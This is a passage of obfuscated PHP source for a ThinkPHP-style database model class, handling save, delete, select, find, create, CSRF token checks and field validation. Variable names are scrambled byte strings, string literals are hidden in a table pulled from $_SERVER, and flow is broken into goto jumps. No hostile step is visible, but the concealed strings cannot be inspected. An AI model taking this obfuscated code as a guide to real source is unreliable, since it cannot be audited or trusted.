isset($eÎÉ¾©ğ¥[$BÙòİÖØ°‹[274]][$eÆêˆ˜ÒÄš])) { $bäæ¡à‘‘ = $eÎÉ¾©ğ¥[$BÙòİÖØ°‹[274]][$eÆêˆ˜ÒÄš]; } if (!1 === $this->_beforeUpdate($aÕù¡ß¯œÙ, $eÎÉ¾©ğ¥)) { return !1; } $d‹™ĞïÓ™  = $this->db->update($aÕù¡ß¯œÙ, $eÎÉ¾©ğ¥); goto bæµ¶Å©›; Eš“Ç‹Èö: $BÙòİÖØ°‹ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (empty($aÕù¡ß¯œÙ)) { if (!empty($this->data)) { $aÕù¡ß¯œÙ = $this->data; $this->data = array(); } else { $this->error = think_lang($BÙòİÖØ°‹[270]); return !1; } } $aÕù¡ß¯œÙ = $this->_facade($aÕù¡ß¯œÙ); goto d´‘­“¢; d´‘­“¢: $eÎÉ¾©ğ¥ = $this->_parseOptions($eÎÉ¾©ğ¥); $eÆêˆ˜ÒÄš = $this->getPk(); if (!isset($eÎÉ¾©ğ¥[$BÙòİÖØ°‹[274]])) { if (isset($aÕù¡ß¯œÙ[$eÆêˆ˜ÒÄš])) { $dêè½¥è‡Û[$eÆêˆ˜ÒÄš] = $aÕù¡ß¯œÙ[$eÆêˆ˜ÒÄš]; $eÎÉ¾©ğ¥[$BÙòİÖØ°‹[274]] = $dêè½¥è‡Û; unset($aÕù¡ß¯œÙ[$eÆêˆ˜ÒÄš]); } else { $this->error = think_lang($BÙòİÖØ°‹[273]); return !1; } } goto b‘’§¼Î›¨; bÃËá‚÷¸: } protected function _beforeUpdate(&$DŒ™‰Ò÷¬, $BŸ¨÷È³…•) { } protected function _afterUpdate($BÚÖ¥¥ ¥‰, $E•À¥±‡ß©) { } public function delete($dš›ó¯‰‰É = array()) { goto E‰¾‘Æ¼Ë°; DË¬òÄŞ•ó: $A‘ìÍ›äÁ„ = $this->db->delete($dš›ó¯‰‰É); if (!1 !== $A‘ìÍ›äÁ„) { $aÓ„ˆÁÄÙ” = array(); if (isset($Añíô¶©ƒŠ)) { $aÓ„ˆÁÄÙ”[$aÖÈÍ©î»] = $Añíô¶©ƒŠ; } $this->_after_delete($aÓ„ˆÁÄÙ”, $dš›ó¯‰‰É); } return $A‘ìÍ›äÁ„; goto C·õåæÛº; DŸ ¦î: if (is_numeric($dš›ó¯‰‰É) || is_string($dš›ó¯‰‰É)) { if (strpos($dš›ó¯‰‰É, $aæ…¤ÊÏ‰†[57])) { $e›ô´Š¶–¦[$aÖÈÍ©î»] = array($aæ…¤ÊÏ‰†[275], $dš›ó¯‰‰É); } else { $e›ô´Š¶–¦[$aÖÈÍ©î»] = $dš›ó¯‰‰É; } $this->options[$aæ…¤ÊÏ‰†[274]] = $e›ô´Š¶–¦; } $dš›ó¯‰‰É = $this->_parseOptions(); if (is_array($dš›ó¯‰‰É[$aæ…¤ÊÏ‰†[274]]) && isset($dš›ó¯‰‰É[$aæ…¤ÊÏ‰†[274]][$aÖÈÍ©î»])) { $Añíô¶©ƒŠ = $dš›ó¯‰‰É[$aæ…¤ÊÏ‰†[274]][$aÖÈÍ©î»]; } goto DË¬òÄŞ•ó; E‰¾‘Æ¼Ë°: $aæ…¤ÊÏ‰† =& $_SERVER[¹÷ˆ§éÒ°ú]; if (empty($dš›ó¯‰‰É) && empty($this->options[$aæ…¤ÊÏ‰†[274]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $aÖÈÍ©î» = $this->getPk(); goto DŸ ¦î; C·õåæÛº: } protected function _after_delete($aÁöİ‹ŒŒÆ, $c„¤½çÜ´‰) { } public function select($b’ã–ŠÍ  = array()) { goto c·¡™­ìœ¬; AĞƒóÌ¥îÓ: $cÜÃùÄ‡ø = $this->db->select($b’ã–ŠÍ ); if (!1 === $cÜÃùÄ‡ø) { return !1; } if (empty($cÜÃùÄ‡ø)) { return null; } goto DŸÇæ¤Óœ´; DŸÇæ¤Óœ´: $this->_afterSelect($cÜÃùÄ‡ø, $b’ã–ŠÍ ); return $cÜÃùÄ‡ø; goto f¼Ï„ª˜åø; c·¡™­ìœ¬: $CÉƒ‹äˆ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (is_string($b’ã–ŠÍ ) || is_numeric($b’ã–ŠÍ )) { $FÚšÂñ† = $this->getPk(); if (strpos($b’ã–ŠÍ , $CÉƒ‹äˆ[57])) { $EË«õ“µ—•[$FÚšÂñ†] = array($CÉƒ‹äˆ[275], $b’ã–ŠÍ ); } else { $EË«õ“µ—•[$FÚšÂñ†] = $b’ã–ŠÍ ; } $this->options[$CÉƒ‹äˆ[274]] = $EË«õ“µ—•; } elseif (!1 === $b’ã–ŠÍ ) { $b’ã–ŠÍ  = $this->_parseOptions(); return $CÉƒ‹äˆ[276] . $this->db->buildSelectSql($b’ã–ŠÍ ) . $CÉƒ‹äˆ[277]; } $b’ã–ŠÍ  = $this->_parseOptions(); goto AĞƒóÌ¥îÓ; f¼Ï„ª˜åø: } protected function _afterSelect(&$C¾ ù­…£é, $FÚœì¦­) { } public function buildSql($a÷ÂìÊâ = array()) { $DÏõ¥¶»öÙ =& $_SERVER[¹÷ˆ§éÒ°ú]; $a÷ÂìÊâ = $this->_parseOptions($a÷ÂìÊâ); return $DÏõ¥¶»öÙ[276] . $this->db->buildSelectSql($a÷ÂìÊâ) . $DÏõ¥¶»öÙ[277]; } public function optionsValue($eáÁÍäê—Ô = null) { if (is_null($eáÁÍäê—Ô)) { return $this->options; } elseif (is_array($eáÁÍäê—Ô)) { $this->options = array_merge($this->options, $eáÁÍäê—Ô); } } protected function _parseOptions($b«øÛ°İ×õ = array()) { goto Dˆ³°°†¿Ì; b‚²ÀĞ¶Û: if (isset($b«øÛ°İ×õ[$FÜÀö«¦Ü˜[274]]) && is_array($b«øÛ°İ×õ[$FÜÀö«¦Ü˜[274]]) && !empty($B×‘¡ „æ) && !isset($b«øÛ°İ×õ[$FÜÀö«¦Ü˜[281]]) && !isset($b«øÛ°İ×õ[$FÜÀö«¦Ü˜[278]])) { foreach ($b«øÛ°İ×õ[$FÜÀö«¦Ü˜[274]] as $A ƒÍçö¼æ => $C©ËÃâ³µæ) { $A ƒÍçö¼æ = trim($A ƒÍçö¼æ); if (in_array($A ƒÍçö¼æ, $B×‘¡ „æ, !0)) { if (is_scalar($C©ËÃâ³µæ)) { $this->_parseType($b«øÛ°İ×õ[$FÜÀö«¦Ü˜[274]], $A ƒÍçö¼æ); } } elseif (!is_numeric($A ƒÍçö¼æ) && $FÜÀö«¦Ü˜[82] != substr($A ƒÍçö¼æ, 0, 1) && !1 === strpos($A ƒÍçö¼æ, $FÜÀö«¦Ü˜[103]) && !1 === strpos($A ƒÍçö¼æ, $FÜÀö«¦Ü˜[259]) && !1 === strpos($A ƒÍçö¼æ, $FÜÀö«¦Ü˜[282]) && !1 === strpos($A ƒÍçö¼æ, $FÜÀö«¦Ü˜[283])) { unset($b«øÛ°İ×õ[$FÜÀö«¦Ü˜[274]][$A ƒÍçö¼æ]); } } } $this->_options_filter($b«øÛ°İ×õ); return $b«øÛ°İ×õ; goto Eğî¤Çƒ¦³; Dˆ³°°†¿Ì: $FÜÀö«¦Ü˜ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (is_array($b«øÛ°İ×õ)) { $b«øÛ°İ×õ = array_merge($this->options, $b«øÛ°İ×õ); } $this->options = array(); goto c¬–äÎÄ; c¬–äÎÄ: if (!isset($b«øÛ°İ×õ[$FÜÀö«¦Ü˜[278]])) { $b«øÛ°İ×õ[$FÜÀö«¦Ü˜[278]] = $this->getTableName(); $B×‘¡ „æ = $this->fields; } else { $B×‘¡ „æ = $this->getDbFields(); } if (!empty($b«øÛ°İ×õ[$FÜÀö«¦Ü˜[279]])) { $b«øÛ°İ×õ[$FÜÀö«¦Ü˜[278]] .= $FÜÀö«¦Ü˜[60] . $b«øÛ°İ×õ[$FÜÀö«¦Ü˜[279]]; } $b«øÛ°İ×õ[$FÜÀö«¦Ü˜[280]] = $this->name; goto b‚²ÀĞ¶Û; Eğî¤Çƒ¦³: } protected function _options_filter(&$E‘‡²ŠÓ¶) { } protected function _parseType(&$a÷‡óÖ¿ÇÊ, $dçóå¸Ñƒ) { $f™©¢¨¼í =& $_SERVER[¹÷ˆ§éÒ°ú]; if (empty($this->options[$f™©¢¨¼í[284]][$f™©¢¨¼í[14] . $dçóå¸Ñƒ])) { $dˆã¤É²ñ‘ = strtolower($this->fields[$f™©¢¨¼í[251]][$dçóå¸Ñƒ]); if (!1 !== strpos($dˆã¤É²ñ‘, $f™©¢¨¼í[285])) { } elseif (!1 === strpos($dˆã¤É²ñ‘, $f™©¢¨¼í[286]) && !1 !== strpos($dˆã¤É²ñ‘, $f™©¢¨¼í[287])) { $a÷‡óÖ¿ÇÊ[$dçóå¸Ñƒ] = intval($a÷‡óÖ¿ÇÊ[$dçóå¸Ñƒ]); } elseif (!1 !== strpos($dˆã¤É²ñ‘, $f™©¢¨¼í[288]) || !1 !== strpos($dˆã¤É²ñ‘, $f™©¢¨¼í[289])) { $a÷‡óÖ¿ÇÊ[$dçóå¸Ñƒ] = floatval($a÷‡óÖ¿ÇÊ[$dçóå¸Ñƒ]); } elseif (!1 !== strpos($dˆã¤É²ñ‘, $f™©¢¨¼í[290])) { $a÷‡óÖ¿ÇÊ[$dçóå¸Ñƒ] = (bool) $a÷‡óÖ¿ÇÊ[$dçóå¸Ñƒ]; } } } public function find($fÔò’ÆœñÑ = array()) { goto a¸½«¸·ÙÚ; A¯Üç¯Öå•: if (empty($D’¿İ‚İâ)) { return null; } $this->data = $D’¿İ‚İâ[0]; $this->_afterFind($this->data, $fÔò’ÆœñÑ); goto fÛ³çÊ½ù…; fÛ³çÊ½ù…: if (!empty($this->options[$EøÎĞƒ¸[292]])) { return $this->returnResult($this->data, $this->options[$EøÎĞƒ¸[292]]); } return $this->data; goto c±Õ›¬; a¸½«¸·ÙÚ: $EøÎĞƒ¸ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (is_numeric($fÔò’ÆœñÑ) || is_string($fÔò’ÆœñÑ)) { $e™½¥ãŠƒ®[$this->getPk()] = intval($fÔò’ÆœñÑ); $this->options[$EøÎĞƒ¸[274]] = $e™½¥ãŠƒ®; } $this->options[$EøÎĞƒ¸[291]] = 1; goto f±Ú¥æî’; f±Ú¥æî’: $fÔò’ÆœñÑ = $this->_parseOptions(); $D’¿İ‚İâ = $this->db->select($fÔò’ÆœñÑ); if (!1 === $D’¿İ‚İâ) { return !1; } goto A¯Üç¯Öå•; c±Õ›¬: } protected function _afterFind(&$Bß’³Ù¤‡‰, $EÍ³¸Ûñì„) { } protected function returnResult($e¿‡âëĞ­—, $aØ­ïöêÆ = '') { $c’ç»Öøµ‘ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($aØ­ïöêÆ) { if (is_callable($aØ­ïöêÆ)) { return call_user_func($aØ­ïöêÆ, $e¿‡âëĞ­—); } switch (strtolower($aØ­ïöêÆ)) { case $c’ç»Öøµ‘[293]: return json_encode($e¿‡âëĞ­—); case $c’ç»Öøµ‘[294]: return xml_encode($e¿‡âëĞ­—); } } return $e¿‡âëĞ­—; } public function parseFieldsMap($bËŸ‹¦‘­÷, $AÁâ™ïóù— = 1) { if (!empty($this->_map)) { foreach ($this->_map as $F‡•Ñìë½‚ => $D³öÔÂŒÁ¦) { if ($AÁâ™ïóù— == 1) { if (isset($bËŸ‹¦‘­÷[$D³öÔÂŒÁ¦])) { $bËŸ‹¦‘­÷[$F‡•Ñìë½‚] = $bËŸ‹¦‘­÷[$D³öÔÂŒÁ¦]; unset($bËŸ‹¦‘­÷[$D³öÔÂŒÁ¦]); } } else { if (isset($bËŸ‹¦‘­÷[$F‡•Ñìë½‚])) { $bËŸ‹¦‘­÷[$D³öÔÂŒÁ¦] = $bËŸ‹¦‘­÷[$F‡•Ñìë½‚]; unset($bËŸ‹¦‘­÷[$F‡•Ñìë½‚]); } } } } return $bËŸ‹¦‘­÷; } public function setField($a›ÙÎÌøò¤, $cÌ¡ôöåÓè = '') { if (is_array($a›ÙÎÌøò¤)) { $f±ã¢ò­ßõ = $a›ÙÎÌøò¤; } else { $f±ã¢ò­ßõ[$a›ÙÎÌøò¤] = $cÌ¡ôöåÓè; } return $this->save($f±ã¢ò­ßõ); } public function setAdd($bù¤Ë—å°ß, $fÖ®»ÉÃ§ä = 1) { $DîĞÎò˜Í =& $_SERVER[¹÷ˆ§éÒ°ú]; $fÀ¦“×Ñ… = $bù¤Ë—å°ß . $DîĞÎò˜Í[295] . $fÖ®»ÉÃ§ä; if ($fÖ®»ÉÃ§ä < 0) { $fÀ¦“×Ñ… = $bù¤Ë—å°ß . $fÖ®»ÉÃ§ä; } return $this->setField($bù¤Ë—å°ß, array($DîĞÎò˜Í[296], $fÀ¦“×Ñ…)); } public function getField($c‹è×È…í‡, $bòƒ³ğ¢ö­ = null) { $d—ùà´ºíŠ =& $_SERVER[¹÷ˆ§éÒ°ú]; $DÓé£ìä‘[$d—ùà´ºíŠ[272]] = $c‹è×È…í‡; $DÓé£ìä‘ = $this->_parseOptions($DÓé£ìä‘); $c‹è×È…í‡ = trim($c‹è×È…í‡); if (strpos($c‹è×È…í‡, $d—ùà´ºíŠ[57])) { if (!isset($DÓé£ìä‘[$d—ùà´ºíŠ[291]])) { $DÓé£ìä‘[$d—ùà´ºíŠ[291]] = is_numeric($bòƒ³ğ¢ö­) ? $bòƒ³ğ¢ö­ : $d—ùà´ºíŠ[43]; } $AšÃ×¹øÌÈ = $this->db->select($DÓé£ìä‘); if (!empty($AšÃ×¹øÌÈ)) { goto DÉ­ùó³™; FÌÛÆÀª„: $AÏ«ÈªˆŞ´ = array_shift($c‹è×È…í‡); $EÃ–ªÎÔº = array(); $F¢ïàÎÙ¬® = count($B˜Õòë³í˜); goto Dßºó Úªµ; Dßºó Úªµ: foreach ($AšÃ×¹øÌÈ as $DÛâÃ“Úù) { $c†µÙí•…“ = $DÛâÃ“Úù[$e™‘§¦£­]; if (2 == $F¢ïàÎÙ¬®) { $EÃ–ªÎÔº[$c†µÙí•…“] = $DÛâÃ“Úù[$AÏ«ÈªˆŞ´]; } else { $EÃ–ªÎÔº[$c†µÙí•…“] = is_string($bòƒ³ğ¢ö­) ? implode($bòƒ³ğ¢ö­, $DÛâÃ“Úù) : $DÛâÃ“Úù; } } return $EÃ–ªÎÔº; goto dÆÌ„¨ôÅ†; DÉ­ùó³™: $B˜Õòë³í˜ = explode($d—ùà´ºíŠ[57], $c‹è×È…í‡); $c‹è×È…í‡ = array_keys($AšÃ×¹øÌÈ[0]); $e™‘§¦£­ = array_shift($c‹è×È…í‡); goto FÌÛÆÀª„; dÆÌ„¨ôÅ†: } } else { if (!0 !== $bòƒ³ğ¢ö­) { $DÓé£ìä‘[$d—ùà´ºíŠ[291]] = is_numeric($bòƒ³ğ¢ö­) ? $bòƒ³ğ¢ö­ : 1; } if ($bòƒ³ğ¢ö­ === $d—ùà´ºíŠ[254]) { unset($DÓé£ìä‘[$d—ùà´ºíŠ[291]]); } $DÛâÃ“Úù = $this->db->select($DÓé£ìä‘); if (!empty($DÛâÃ“Úù)) { if ($bòƒ³ğ¢ö­ === $d—ùà´ºíŠ[254]) { return reset($DÛâÃ“Úù[0]); } if (!0 !== $bòƒ³ğ¢ö­ && 1 == $DÓé£ìä‘[$d—ùà´ºíŠ[291]]) { return reset($DÛâÃ“Úù[0]); } foreach ($DÛâÃ“Úù as $bïºÔ²…«…) { $B–†‚„… [] = $bïºÔ²…«…[$c‹è×È…í‡]; } return $B–†‚„… ; } } return null; } public function create($C‘ù±â¥Š = '', $a›ƒË·Íå = '') { goto FÛÑƒ„§Š”; B–›ØÑƒÂ¼: return $C‘ù±â¥Š; goto dÇÔğ…ƒ…; c¸ËÃäá¿‰: if (isset($aš¹šºè×)) { if (is_string($aš¹šºè×)) { $aš¹šºè× = explode($b¨§à“Ï—„[57], $aš¹šºè×); } if (think_config($b¨§à“Ï—„[297])) { $aš¹šºè×[] = think_config($b¨§à“Ï—„[298]); } foreach ($C‘ù±â¥Š as $bÄµÃ÷˜óí => $cÇ•ñ‹óÈ) { if (!in_array($bÄµÃ÷˜óí, $aš¹šºè×)) { unset($C‘ù±â¥Š[$bÄµÃ÷˜óí]); } } } if (!$this->autoValidation($C‘ù±â¥Š, $a›ƒË·Íå)) { return !1; } if (!$this->autoCheckToken($C‘ù±â¥Š)) { $this->error = think_lang($b¨§à“Ï—„[299]); return !1; } goto B·…åÅ¸•; Fé†×Ù¦¦è: $C‘ù±â¥Š = $this->parseFieldsMap($C‘ù±â¥Š, 0); $a›ƒË·Íå = $a›ƒË·Íå ? $a›ƒË·Íå : (!empty($C‘ù±â¥Š[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$b¨§à“Ï—„[272]])) { $aš¹šºè× = $this->options[$b¨§à“Ï—„[272]]; unset($this->options[$b¨§à“Ï—„[272]]); } elseif ($a›ƒË·Íå == THINK_MODEL_INSERT && isset($this->insertFields)) { $aš¹šºè× = $this->insertFields; } elseif ($a›ƒË·Íå == THINK_MODEL_UPDATE && isset($this->updateFields)) { $aš¹šºè× = $this->updateFields; } goto c¸ËÃäá¿‰; B·…åÅ¸•: if ($this->autoCheckFields) { $aš¹šºè× = $this->getDbFields(); foreach ($C‘ù±â¥Š as $bÄµÃ÷˜óí => $cÇ•ñ‹óÈ) { if (!in_array($bÄµÃ÷˜óí, $aš¹šºè×)) { unset($C‘ù±â¥Š[$bÄµÃ÷˜óí]); } elseif (MAGIC_QUOTES_GPC && is_string($cÇ•ñ‹óÈ)) { $C‘ù±â¥Š[$bÄµÃ÷˜óí] = stripslashes($cÇ•ñ‹óÈ); } } } $this->autoOperation($C‘ù±â¥Š, $a›ƒË·Íå); $this->data = $C‘ù±â¥Š; goto B–›ØÑƒÂ¼; FÛÑƒ„§Š”: $b¨§à“Ï—„ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (empty($C‘ù±â¥Š)) { $C‘ù±â¥Š = $_POST; } elseif (is_object($C‘ù±â¥Š)) { $C‘ù±â¥Š = get_object_vars($C‘ù±â¥Š); } if (empty($C‘ù±â¥Š) || !is_array($C‘ù±â¥Š)) { $this->error = think_lang($b¨§à“Ï—„[270]); return !1; } goto Fé†×Ù¦¦è; dÇÔğ…ƒ…: } public function autoCheckToken($cƒ¹Ñ•Ÿçæ) { $FùîÉËÍÎè =& $_SERVER[¹÷ˆ§éÒ°ú]; if (isset($this->options[$FùîÉËÍÎè[300]]) && !$this->options[$FùîÉËÍÎè[300]]) { return !0; } if (think_config($FùîÉËÍÎè[297])) { $d†ÆÊÉ½ = think_config($FùîÉËÍÎè[298]); if (!isset($cƒ¹Ñ•Ÿçæ[$d†ÆÊÉ½]) || Session::get($d†ÆÊÉ½)) { return !1; } list($cèµ©‘µ, $a‹À…·âŒ‘) = explode($FùîÉËÍÎè[82], $cƒ¹Ñ•Ÿçæ[$d†ÆÊÉ½]); if ($a‹À…·âŒ‘ && Session::get($d†ÆÊÉ½ . $FùîÉËÍÎè[103] . $cèµ©‘µ) === $a‹À…·âŒ‘) { Session::remove($d†ÆÊÉ½ . $FùîÉËÍÎè[103] . $cèµ©‘µ); return !0; } if (think_config($FùîÉËÍÎè[301])) { Session::remove($d†ÆÊÉ½ . $FùîÉËÍÎè[103] . $cèµ©‘µ); } return !1; } return !0; } public function regex($dêä„î¦àˆ, $Dš³‘êÅ¦®) { $Eˆçî¥¥¯ =& $_SERVER[¹÷ˆ§éÒ°ú]; $DÙËâğÌŞ† = array($Eˆçî¥¥¯[302] => $Eˆçî¥¥¯[303], $Eˆçî¥¥¯[304] => $Eˆçî¥¥¯[305], $Eˆçî¥¥¯[306] => $Eˆçî¥¥¯[307], $Eˆçî¥¥¯[308] => $Eˆçî¥¥¯[309], $Eˆçî¥¥¯[310] => $Eˆçî¥¥¯[311], $Eˆçî¥¥¯[312] => $Eˆçî¥¥¯[313], $Eˆçî¥¥¯[314] => $Eˆçî¥¥¯[315], $Eˆçî¥¥¯[289] => $Eˆçî¥¥¯[316], $Eˆçî¥¥¯[317] => $Eˆçî¥¥¯[318]); if (isset($DÙËâğÌŞ†[strtolower($Dš³‘êÅ¦®)])) { $Dš³‘êÅ¦® = $DÙËâğÌŞ†[strtolower($Dš³‘êÅ¦®)]; } return preg_match($Dš³‘êÅ¦®, $dêä„î¦àˆ) === 1; } private function autoOperation(&$eÆ¡›äÕõ, $E´†ö†…‘ª) { $D—¥Ê±İ‡Ë =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!empty($this->options[$D—¥Ê±İ‡Ë[319]])) { $B¬‡¼‡‘‰‹ = $this->options[$D—¥Ê±İ‡Ë[319]]; unset($this->options[$D—¥Ê±İ‡Ë[319]]); } elseif (!empty($this->_auto)) { $B¬‡¼‡‘‰‹ = $this->_auto; } if (isset($B¬‡¼‡‘‰‹)) { foreach ($B¬‡¼‡‘‰‹ as $cáŒÏŒ¥—ß) { if (empty($cáŒÏŒ¥—ß[2])) { $cáŒÏŒ¥—ß[2] = THINK_MODEL_INSERT; } if ($E´†ö†…‘ª == $cáŒÏŒ¥—ß[2] || $cáŒÏŒ¥—ß[2] == THINK_MODEL_BOTH) { switch (trim($cáŒÏŒ¥—ß[3])) { case $D—¥Ê±İ‡Ë[320]: case $D—¥Ê±İ‡Ë[321]: $c«ï„ŒÅÛÍ = isset($cáŒÏŒ¥—ß[4]) ? (array) $cáŒÏŒ¥—ß[4] : array(); if (isset($eÆ¡›äÕõ[$cáŒÏŒ¥—ß[0]])) { array_unshift($c«ï„ŒÅÛÍ, $eÆ¡›äÕõ[$cáŒÏŒ¥—ß[0]]); } if ($D—¥Ê±İ‡Ë[320] == $cáŒÏŒ¥—ß[3]) { $eÆ¡›äÕõ[$cáŒÏŒ¥—ß[0]] = call_user_func_array($cáŒÏŒ¥—ß[1], $c«ï„ŒÅÛÍ); } else { $eÆ¡›äÕõ[$cáŒÏŒ¥—ß[0]] = call_user_func_array(array(&$this, $cáŒÏŒ¥—ß[1]), $c«ï„ŒÅÛÍ); } break; case $D—¥Ê±İ‡Ë[272]: $eÆ¡›äÕõ[$cáŒÏŒ¥—ß[0]] = $eÆ¡›äÕõ[$cáŒÏŒ¥—ß[1]]; break; case $D—¥Ê±İ‡Ë[322]: if ($D—¥Ê±İ‡Ë[43] === $eÆ¡›äÕõ[$cáŒÏŒ¥—ß[0]]) { unset($eÆ¡›äÕõ[$cáŒÏŒ¥—ß[0]]); } break; case $D—¥Ê±İ‡Ë[323]: default: $eÆ¡›äÕõ[$cáŒÏŒ¥—ß[0]] = $cáŒÏŒ¥—ß[1]; } if (!1 === $eÆ¡›äÕõ[$cáŒÏŒ¥—ß[0]]) { unset($eÆ¡›äÕõ[$cáŒÏŒ¥—ß[0]]); } } } } return $eÆ¡›äÕõ; } protected function autoValidation($Cç¼‡„©â, $EÃíõ¶Ò•÷) { $aÓ…ˆ§Á¼ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!empty($this->options[$aÓ…ˆ§Á¼[324]])) { $A“œ©Æ»Ù† = $this->options[$aÓ…ˆ§Á¼[324]]; unset($this->options[$aÓ…ˆ§Á¼[324]]); } elseif (!empty($this->_validate)) { $A“œ©Æ»Ù† = $this->_validate; } if (isset($A“œ©Æ»Ù†)) { if ($this->patchValidate) { $this->error = array(); } foreach ($A“œ©Æ»Ù† as $eï§—Ì÷à => $eí¹§òßñ‚) { if (empty($eí¹§òßñ‚[5]) || $eí¹§òßñ‚[5] == THINK_MODEL_BOTH || $eí¹§òßñ‚[5] == $EÃíõ¶Ò•÷) { if (0 == strpos($eí¹§òßñ‚[2], $aÓ…ˆ§Á¼[325]) && strpos($eí¹§òßñ‚[2], $aÓ…ˆ§Á¼[326])) { $eí¹§òßñ‚[2] = think_lang(substr($eí¹§òßñ‚[2], 2, -1)); } $eí¹§òßñ‚[3] = isset($eí¹§òßñ‚[3]) ? $eí¹§òßñ‚[3] : THINK_EXISTS_VALIDATE; $eí¹§òßñ‚[4] = isset($eí¹§òßñ‚[4]) ? $eí¹§òßñ‚[4] : $aÓ…ˆ§Á¼[327]; switch ($eí¹§òßñ‚[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Cç¼‡„©â, $eí¹§òßñ‚)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($aÓ…ˆ§Á¼[43] != trim($Cç¼‡„©â[$eí¹§òßñ‚[0]])) { if (!1 === $this->_validationField($Cç¼‡„©â, $eí¹§òßñ‚)) { return !1; } } break; default: if (isset($Cç¼‡„©â[$eí¹§òßñ‚[0]])) { if (!1 === $this->_validationField($Cç¼‡„©â, $eí¹§òßñ‚)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Dë‹­…‰‡Ê, $Aïî¿„†™™) { if (!1 === $this->_validationFieldItem($Dë‹­…‰‡Ê, $Aïî¿„†™™)) { if ($this->patchValidate) { $this->error[$Aïî¿„†™™[0]] = $Aïî¿„†™™[2]; } else { $this->error = $Aïî¿„†™™[2]; return !1; } } return; } protected function _validationFieldItem($DŒ÷©¬­¬, $cæ¹Í—éè¸) { $a°ÄîÍâÇ„ =& $_SERVER[¹÷ˆ§éÒ°ú]; switch (strtolower(trim($cæ¹Í—éè¸[4]))) { case $a°ÄîÍâÇ„[320]: case $a°ÄîÍâÇ„[321]: $d¬ô˜ ±Ì¶ = isset($cæ¹Í—éè¸[6]) ? (array) $cæ¹Í—éè¸[6] : array(); if (is_string($cæ¹Í—éè¸[0]) && strpos($cæ¹Í—éè¸[0], $a°ÄîÍâÇ„[57])) { $cæ¹Í—éè¸[0] = explode($a°ÄîÍâÇ„[57], $cæ¹Í—éè¸[0]); } if (is_array($cæ¹Í—éè¸[0])) { foreach ($cæ¹Í—éè¸[0] as $a²¯î½âô) { $BİÉİ¤‹ÌŞ[$a²¯î½âô] = $DŒ÷©¬­¬[$a²¯î½âô]; } array_unshift($d¬ô˜ ±Ì¶, $BİÉİ¤‹ÌŞ); } else { array_unshift($d¬ô˜ ±Ì¶, $DŒ÷©¬­¬[$cæ¹Í—éè¸[0]]); } if ($a°ÄîÍâÇ„[320] == $cæ¹Í—éè¸[4]) { return call_user_func_array($cæ¹Í—éè¸[1], $d¬ô˜ ±Ì¶); } else { return call_user_func_array(array(&$this, $cæ¹Í—éè¸[1]), $d¬ô˜ ±Ì¶); } case $a°ÄîÍâÇ„[328]: return $DŒ÷©¬­¬[$cæ¹Í—éè¸[0]] == $DŒ÷©¬­¬[$cæ¹Í—éè¸[1]]; case $a°ÄîÍâÇ„[329]: if (is_string($cæ¹Í—éè¸[0]) && strpos($cæ¹Í—éè¸[0], $a°ÄîÍâÇ„[57])) { $cæ¹Í—éè¸[0] = explode($a°ÄîÍâÇ„[57], $cæ¹Í—éè¸[0]); } $E›òß¬î™ò = array(); if (is_array($cæ¹Í—éè¸[0])) { foreach ($cæ¹Í—éè¸[0] as $a²¯î½âô) { $E›òß¬î™ò[$a²¯î½âô] = $DŒ÷©¬­¬[$a²¯î½âô]; } } else { $E›òß¬î™ò[$cæ¹Í—éè¸[0]] = $DŒ÷©¬­¬[$cæ¹Í—éè¸[0]]; } if (!empty($DŒ÷©¬­¬[$this->getPk()])) { $E›òß¬î™ò[$this->getPk()] = array($a°ÄîÍâÇ„[330], $DŒ÷©¬­¬[$this->getPk()]); } if ($this->where($E›òß¬î™ò)->find()) { return !1; } return !0; default: return $this->check($DŒ÷©¬­¬[$cæ¹Í—éè¸[0]], $cæ¹Í—éè¸[1], $cæ¹Í—éè¸[4]); } } public function check($f„Şà«, $b÷âø¼àÅ, $B´‡ïÄ—„ = "\162\x65\x67\x65\170") { $e×Š…Ó³í¨ =& $_SERVER[¹÷ˆ§éÒ°ú]; $B´‡ïÄ—„ = strtolower(trim($B´‡ïÄ—„)); switch ($B´‡ïÄ—„) { case $e×Š…Ó³í¨[17]: case $e×Š…Ó³í¨[331]: $b¿í·§íê = is_array($b÷âø¼àÅ) ? $b÷âø¼àÅ : explode($e×Š…Ó³í¨[57], $b÷âø¼àÅ); return $B´‡ïÄ—„ == $e×Š…Ó³í¨[17] ? in_array($f„Şà«, $b¿í·§íê) : !in_array($f„Şà«, $b¿í·§íê); case $e×Š…Ó³í¨[332]: case $e×Š…Ó³í¨[333]: if (is_array($b÷âø¼àÅ)) { $dĞ¦—ºÜ¾Õ = $b÷âø¼àÅ[0]; $bâÁœ®íÅ‚ = $b÷âø¼àÅ[1]; } else { list($dĞ¦—ºÜ¾Õ, $bâÁœ®íÅ‚) = explode($e×Š…Ó³í¨[57], $b÷âø¼àÅ); } return $B´‡ïÄ—„ == $e×Š…Ó³í¨[332] ? $f„Şà« >= $dĞ¦—ºÜ¾Õ && $f„Şà« <= $bâÁœ®íÅ‚ : $f„Şà« < $dĞ¦—ºÜ¾Õ || $f„Şà« > $bâÁœ®íÅ‚; case $e×Š…Ó³í¨[334]: case $e×Š…Ó³í¨[335]: return $B´‡ïÄ—„ == $e×Š…Ó³í¨[334] ? $f„Şà« == $b÷âø¼àÅ : $f„Şà« != $b÷âø¼àÅ; case $e×Š…Ó³í¨[336]: $E¹±“–ÍÖ = mb_strlen($f„Şà«, $e×Š…Ó³í¨[337]); if (strpos($b÷âø¼àÅ, $e×Š…Ó³í¨[57])) { list($dĞ¦—ºÜ¾Õ, $bâÁœ®íÅ‚) = explode($e×Š…Ó³í¨[57], $b÷âø¼àÅ); return $E¹±“–ÍÖ >= $dĞ¦—ºÜ¾Õ && $E¹±“–ÍÖ <= $bâÁœ®íÅ‚; } else { return 